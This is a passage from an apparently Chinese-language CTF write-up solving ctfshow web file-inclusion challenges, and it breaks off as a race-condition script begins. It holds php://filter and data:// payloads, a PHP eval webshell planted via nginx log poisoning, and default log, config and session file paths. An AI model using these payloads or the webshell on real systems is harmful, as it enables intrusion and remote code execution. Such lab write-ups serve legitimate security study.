<span class="line"><span style="color:#d4d4d4">{</span><span style="color:#dcdcaa">"0"</span><span style="color:#dcdcaa">:</span><span style="color:#dcdcaa">"success"</span><span style="color:#dcdcaa">,</span><span style="color:#dcdcaa">"msg"</span><span style="color:#dcdcaa">:</span><span style="color:#dcdcaa">"\u606d\u559c\u60a8\uff0c\u60a8\u5df2\u88ab\u6211\u6821\u5f55\u53d6\uff0c\u4f60\u7684\u5b66\u53f7\u4e3a02015237 \u521d\u59cb\u5bc6\u7801\u4e3a\u8eab\u4efd\u8bc1\u53f7\u7801"</span><span style="color:#dcdcaa">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#dcdcaa">unicode转中文：</span></span>
<span class="line"><span style="color:#dcdcaa">恭喜您，您已被我校录取，你的学号为02015237</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">初始密码为身份证号码</span></span></code></pre></div></div></figure><p>返回登陆：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222151177.png" srcset="/img/loading/loading.gif" lazyload alt="image-20221101210101292"></p><p>flag：</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#dcdcaa">ctfshow</span><span style="color:#d4d4d4">{f20dfe36-0c2e-4bfd-a182-090c0f8a6666}</span></span></code></pre></div></div></figure><h3 id="web28去掉特殊-爆破目录"><a class="markdownIt-Anchor" href="#web28去掉特殊-爆破目录"></a> web28	(去掉特殊 爆破目录)</h3><p>根据提示，去掉 2.txt 进行抓包爆破：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222151141.png" srcset="/img/loading/loading.gif" lazyload alt="image-20221101211449922"></p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222151595.png" srcset="/img/loading/loading.gif" lazyload alt="image-20221101211646476"></p><p>注意设置步长为 1</p><p>查看返回包状态为 200。</p><h2 id="文件包含"><a class="markdownIt-Anchor" href="#文件包含"></a> 文件包含</h2><p>文件包含漏洞利用手法：</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#dcdcaa">1.php伪协议</span></span>
<span class="line"><span style="color:#dcdcaa">2.包含日志文件</span></span>
<span class="line"><span style="color:#dcdcaa">3.包含系统文件</span></span></code></pre></div></div></figure><p><strong>1.php 伪协议中的 filter 的 reference</strong>：</p><p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html?page=2#reply-list">谈一谈 php://filter 的妙用</a></p><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8163#toc-3">file_put_content 和死亡・杂糅代码之缘</a></p><p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.file-put-contents.php">file_put_contents — 将一个字符串写入文件</a></p><p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/mbstring.supported-encodings.php">php 支持的字符编码</a></p><p>2. <strong>包含日志文件</strong>，日志和配置文件默认存放路径：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">apache+Linux日志默认路径：</span></span>
<span class="line"><span style="color:#d4d4d4">/etc/httpd/logs/access_log</span></span>
<span class="line"><span style="color:#d4d4d4">/</span><span style="color:#569cd6">var</span><span style="color:#d4d4d4">/log/httpd/access_log</span></span></code></pre></div></div></figure><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#dcdcaa">apache+win2003日志默认路径</span><span style="color:#d4d4d4"> </span></span>
<span class="line"><span style="color:#dcdcaa">D:\xampp\apache\logs\access.log</span></span>
<span class="line"><span style="color:#dcdcaa">D:\xampp\apache\logs\error.log</span></span></code></pre></div></div></figure><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#dcdcaa">IIS6.0+win2003默认日志文件</span><span style="color:#d4d4d4"> </span></span>
<span class="line"><span style="color:#dcdcaa">C:\WINDOWS\system32\Logfiles</span></span></code></pre></div></div></figure><figure class="shiki html"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">IIS7.0+win2003 默认日志文件  %SystemDrive%\inetpub\logs\LogFiles</span></span></code></pre></div></div></figure><figure class="shiki"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">nginx 日志文件 </span></span>
<span class="line"><span style="color:#d4d4d4">用户安装目录logs目录下（/usr/local/nginx/logs） </span></span>
<span class="line"><span style="color:#d4d4d4">/var/log/nginx/access.log</span></span>
<span class="line"><span style="color:#d4d4d4">/var/log/nginx/error.log</span></span></code></pre></div></div></figure><figure class="shiki"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">apache+linux 默认配置文件 </span></span>
<span class="line"><span style="color:#d4d4d4">/etc/httpd/conf/httpd.conf</span></span>
<span class="line"><span style="color:#d4d4d4">index.php?page=/etc/init.d/httpd</span></span></code></pre></div></div></figure><figure class="shiki"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">IIS6.0+win2003 配置文件 C:/Windows/system32/inetsrv/metabase.xml</span></span></code></pre></div></div></figure><figure class="shiki"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">IIS7.0+WIN 配置文件 C:\Windows\System32\inetsrv\config\applicationHost.config</span></span></code></pre></div></div></figure><p><strong>session</strong> 常见存储路径：</p><blockquote><p>php 的 session 文件的保存路径可以在 phpinfo 的 <strong>session.save_path</strong> 看到<br>session 文件格式： sess_[phpsessid] ，phpsessid 在发送的请求的 cookie 字段中可以看到</p></blockquote><figure class="shiki"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">/var/lib/php/sess_PHPSESSID</span></span>
<span class="line"><span style="color:#d4d4d4">/var/lib/php/sess_PHPSESSID</span></span>
<span class="line"><span style="color:#d4d4d4">/tmp/sess_PHPSESSID</span></span>
<span class="line"><span style="color:#d4d4d4">/tmp/sessions/sess_PHPSESSID</span></span></code></pre></div></div></figure><p>3. <strong>包含系统文件</strong></p><figure class="shiki html"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">包含/pros/self/environ</span></span></code></pre></div></div></figure><p>条件：</p><figure class="shiki"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">1.php以cgi方式运行，这样environ才会保持UA头。</span></span>
<span class="line"><span style="color:#d4d4d4">2.environ文件存储位置已知，且environ文件可读。</span></span></code></pre></div></div></figure><blockquote><p>proc/self/environ 中会保存 user-agent 头，如果在 user-agent 中插入 php 代码，则 php 代码会被写入到 environ 中，之后再包含它，即可。</p></blockquote><h3 id="web78filter伪协议读取"><a class="markdownIt-Anchor" href="#web78filter伪协议读取"></a> web78	(filter 伪协议读取)</h3><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4"> &lt;?php</span></span>
<span class="line"></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'file'</span><span style="color:#d4d4d4">])){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$file</span><span style="color:#d4d4d4"> = </span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'file'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">include</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$file</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">}</span><span style="color:#c586c0">else</span><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#dcdcaa">highlight_file</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">__FILE__</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span></code></pre></div></div></figure><p>直接常规使用 php://filter 读一下 flag.php，反正没损失：</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#9cdcfe">PD9waHANCg0KLyoNCiMgLSotIGNvZGluZzogdXRmLTggLSotDQojIEBBdXRob3I6IGgxeGENCiMgQERhdGU6ICAgMjAyMC0wOS0xNiAxMDo1NToxMQ0KIyBATGFzdCBNb2RpZmllZCBieTogICBoMXhhDQojIEBMYXN0IE1vZGlmaWVkIHRpbWU6IDIwMjAtMDktMTYgMTA6NTU6MjANCiMgQGVtYWlsOiBoMXhhQGN0ZmVyLmNvbQ0KIyBAbGluazogaHR0cHM6Ly9jdGZlci5jb20NCg0KKi8NCg0KDQokZmxhZz0iY3Rmc2hvd3thZDc4MzEzNC05YjU2LTQxMmEtOTU1NC03NzIwZjgwYzljZDF9Ijs</span><span style="color:#d4d4d4">=</span></span></code></pre></div></div></figure><p>得到 base64，解密：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">&lt;?php</span></span>
<span class="line"><span style="color:#9cdcfe">$flag</span><span style="color:#d4d4d4">=</span><span style="color:#ce9178">"ctfshow{ad783134-9b56-412a-9554-7720f80c9cd1}"</span><span style="color:#d4d4d4">;</span></span></code></pre></div></div></figure><p>得到 flag。</p><h3 id="web79data伪协议"><a class="markdownIt-Anchor" href="#web79data伪协议"></a> web79	(data 伪协议)</h3><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4"> &lt;?php</span></span>
<span class="line"></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'file'</span><span style="color:#d4d4d4">])){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$file</span><span style="color:#d4d4d4"> = </span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'file'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$file</span><span style="color:#d4d4d4"> = </span><span style="color:#dcdcaa">str_replace</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"php"</span><span style="color:#d4d4d4">, </span><span style="color:#ce9178">"???"</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$file</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">include</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$file</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">}</span><span style="color:#c586c0">else</span><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#dcdcaa">highlight_file</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">__FILE__</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span></code></pre></div></div></figure><p>这里有个字符串替换，检测到 php 然后直接被替换成？？？</p><blockquote><p>str_replace () 函数以其他字符替换字符串中的一些字符（区分大小写）。</p><p>该函数必须遵循下列规则：</p><ul><li>如果搜索的字符串是数组，那么它将返回数组。</li><li>如果搜索的字符串是数组，那么它将对数组中的每个元素进行查找和替换。</li><li>如果同时需要对数组进行查找和替换，并且需要执行替换的元素少于查找到的元素的数量，那么多余元素将用空字符串进行替换</li><li>如果查找的是数组，而替换的是字符串，那么替代字符串将对所有查找到的值起作用。</li></ul><p>注释：该函数区分大小写。请使用 <a target="_blank" rel="noopener" href="https://www.w3school.com.cn/php/func_string_str_ireplace.asp">str_ireplace()</a> 函数执行不区分大小写的搜索。</p><p>注释：该函数是二进制安全的。</p></blockquote><p>那么这里就不能用 php:// 的为协议进行操作了，但是伪协议家族中还有个和 php:// 差不多的协议：data://</p><blockquote><ol><li>php 版本大于等于 php5.2</li><li>allow_url_fopen = On</li><li>allow_url_include = On</li></ol></blockquote><p>用法：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">data:</span><span style="color:#6a9955">//text/plain,</span></span>
<span class="line"><span style="color:#d4d4d4">data:</span><span style="color:#6a9955">//text/plain;base64,</span></span></code></pre></div></div></figure><p>构造 payload：</p><figure class="shiki"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+</span></span>
<span class="line"><span style="color:#d4d4d4">这里注意+号要进行url编码成%2b</span></span>
<span class="line"><span style="color:#d4d4d4">?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span></span></code></pre></div></div></figure><blockquote><p>这里的 + 会被当做空格处理，base64 解码的时候会忽略空格，自动在后面加上一个 =</p><p>即：PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8=</p><p>解码后：&lt;?php eval ($_POST [1]);? 这样传进去就会报错</p><p><strong>解决方法：将 + 进行 urlencode</strong></p></blockquote><p>这句话构造的是 phpinfo，但是经过查看发现 phpinfo 并不能找到 flag。</p><p>于是构造：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">?file=data:</span><span style="color:#6a9955">//text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</span></span>
<span class="line"><span style="color:#d4d4d4">base64_decode:</span></span>
<span class="line"><span style="color:#d4d4d4">&lt;?php </span><span style="color:#dcdcaa">system</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'cat flag.php'</span><span style="color:#d4d4d4">);?&gt;</span></span></code></pre></div></div></figure><p>flag:</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#dcdcaa">ctfshow</span><span style="color:#d4d4d4">{af46f6e1-2e87-49d3-a0c1-d9d7a411d59c}</span></span></code></pre></div></div></figure><h3 id="web80包含日志文件"><a class="markdownIt-Anchor" href="#web80包含日志文件"></a> web80	(包含日志文件)</h3><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">&lt;?php</span></span>
<span class="line"></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'file'</span><span style="color:#d4d4d4">])){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$file</span><span style="color:#d4d4d4"> = </span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'file'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$file</span><span style="color:#d4d4d4"> = </span><span style="color:#dcdcaa">str_replace</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"php"</span><span style="color:#d4d4d4">, </span><span style="color:#ce9178">"???"</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$file</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$file</span><span style="color:#d4d4d4"> = </span><span style="color:#dcdcaa">str_replace</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"data"</span><span style="color:#d4d4d4">, </span><span style="color:#ce9178">"???"</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$file</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">include</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$file</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">}</span><span style="color:#c586c0">else</span><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#dcdcaa">highlight_file</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">__FILE__</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span></code></pre></div></div></figure><p>这次 data 也被过滤，只能另寻办法。</p><p>这里采用包含日志文件 (也可以 php://input)：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#6a9955">// 先查看请求头得到服务器类型：</span></span>
<span class="line"><span style="color:#d4d4d4">Server: nginx/</span><span style="color:#b5cea8">1.18.0</span><span style="color:#d4d4d4"> (Ubuntu)</span></span></code></pre></div></div></figure><p>构造 payload：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">?file=/</span><span style="color:#569cd6">var</span><span style="color:#d4d4d4">/log/nginx/access</span><span style="color:#d4d4d4">.</span><span style="color:#d4d4d4">log</span></span></code></pre></div></div></figure><p>得到回显，发现显示的有访问端的浏览器信息，于是进行抓包修改上传一句话后门：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">&lt;?php @</span><span style="color:#dcdcaa">eval</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_POST</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'a'</span><span style="color:#d4d4d4">]);?&gt;</span></span></code></pre></div></div></figure><p>然后用蚁剑或者直接命令控制找到 fl0g.php 得到 flag：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">ctfshow{</span><span style="color:#b5cea8">7230</span><span style="color:#d4d4d4">bb0d-b8f8-</span><span style="color:#b5cea8">4</span><span style="color:#d4d4d4">f13-b00c-</span><span style="color:#b5cea8">3</span><span style="color:#d4d4d4">a0e5e3dcd99}</span></span></code></pre></div></div></figure><h3 id="web81包含日志文件"><a class="markdownIt-Anchor" href="#web81包含日志文件"></a> web81	(包含日志文件)</h3><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">&lt;?php</span></span>
<span class="line"></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'file'</span><span style="color:#d4d4d4">])){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$file</span><span style="color:#d4d4d4"> = </span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'file'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$file</span><span style="color:#d4d4d4"> = </span><span style="color:#dcdcaa">str_replace</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"php"</span><span style="color:#d4d4d4">, </span><span style="color:#ce9178">"???"</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$file</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$file</span><span style="color:#d4d4d4"> = </span><span style="color:#dcdcaa">str_replace</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"data"</span><span style="color:#d4d4d4">, </span><span style="color:#ce9178">"???"</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$file</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$file</span><span style="color:#d4d4d4"> = </span><span style="color:#dcdcaa">str_replace</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">":"</span><span style="color:#d4d4d4">, </span><span style="color:#ce9178">"???"</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$file</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">include</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$file</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">}</span><span style="color:#c586c0">else</span><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#dcdcaa">highlight_file</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">__FILE__</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span></code></pre></div></div></figure><p>这道题和上一道只多了一个冒号 ' : ' 的过滤，还是可以通过包含日志文件进行 getshell 得到 flag：</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#dcdcaa">ctfshow</span><span style="color:#d4d4d4">{a6fbd083-6f4c-4c2c-ba8f-f0ed18b729c9}</span></span></code></pre></div></div></figure><h3 id="web82-86条件竞争"><a class="markdownIt-Anchor" href="#web82-86条件竞争"></a> web82-86	(条件竞争)</h3><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">&lt;?php</span></span>
<span class="line"></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'file'</span><span style="color:#d4d4d4">])){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$file</span><span style="color:#d4d4d4"> = </span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'file'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$file</span><span style="color:#d4d4d4"> = </span><span style="color:#dcdcaa">str_replace</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"php"</span><span style="color:#d4d4d4">, </span><span style="color:#ce9178">"???"</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$file</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$file</span><span style="color:#d4d4d4"> = </span><span style="color:#dcdcaa">str_replace</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"data"</span><span style="color:#d4d4d4">, </span><span style="color:#ce9178">"???"</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$file</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$file</span><span style="color:#d4d4d4"> = </span><span style="color:#dcdcaa">str_replace</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">":"</span><span style="color:#d4d4d4">, </span><span style="color:#ce9178">"???"</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$file</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$file</span><span style="color:#d4d4d4"> = </span><span style="color:#dcdcaa">str_replace</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"."</span><span style="color:#d4d4d4">, </span><span style="color:#ce9178">"???"</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$file</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">include</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$file</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">}</span><span style="color:#c586c0">else</span><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#dcdcaa">highlight_file</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">__FILE__</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span></code></pre></div></div></figure><p>这道题又新加了一个句号点 ' . ' 的过滤，又得另寻他法。</p><p>hint: 竞争环境需要晚上 11 点 30 分至次日 7 时 30 分之间做，其他时间不开放竞争条件</p><p>所以这里使用 session.upload_progress 文件包含进行条件竞争</p><p><strong>reference</strong>：</p><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/288430.html">https://www.freebuf.com/articles/web/288430.html</a></p><p>and</p><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/202819.html">https://www.freebuf.com/vuls/202819.html</a></p><p>主要看第二个链接</p><p>将条件竞争脚本写好，这里引用 yu22x 师傅的 all in one 脚本可一把梭：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">import requests</span></span>
<span class="line"><span style="color:#d4d4d4">import threading</span></span>
<span class="line"><span style="color:#d4d4d4">import sys</span></span>
<span class="line"><span style="color:#d4d4d4">session=requests</span><span style="color:#d4d4d4">.</span><span style="color:#dcdcaa">session</span><span style="color:#d4d4d4">()</span></span>
